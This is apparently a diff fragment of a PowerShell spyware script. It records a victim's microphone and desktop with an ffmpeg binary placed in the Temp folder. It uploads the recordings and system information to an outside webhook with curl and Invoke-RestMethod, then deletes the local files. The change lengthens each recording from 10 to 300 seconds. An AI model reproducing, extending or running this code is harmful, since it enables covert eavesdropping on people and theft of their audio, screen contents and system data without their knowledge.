@@ -934,7 +934,7 @@ param ([int[]]$t)
     function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
     $id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName
     $mp3Path = "$env:Temp\AudioClip.mp3"
-    if ($t.Length -eq 0){$t = 10}
+    if ($t.Length -eq 0){$t = 300}
     .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $mp3Path
     curl.exe -F file1=@"$mp3Path" $hookurl | Out-Null
     sleep 5
@@ -951,8 +951,8 @@ param ([int[]]$t)
     Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
     
     $mkvPath = "$env:Temp\ScreenClip.mkv"
-    if ($t.Length -eq 0){$t = 10}
-    .$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
+    if ($t.Length -eq 0){$t = 300}
+    .$env:Temp\ffmpeg.exe -f gdigrab -t 300 -framerate 30 -i desktop $mkvPath
     curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
     sleep 5
     rm -Path $mkvPath -Force
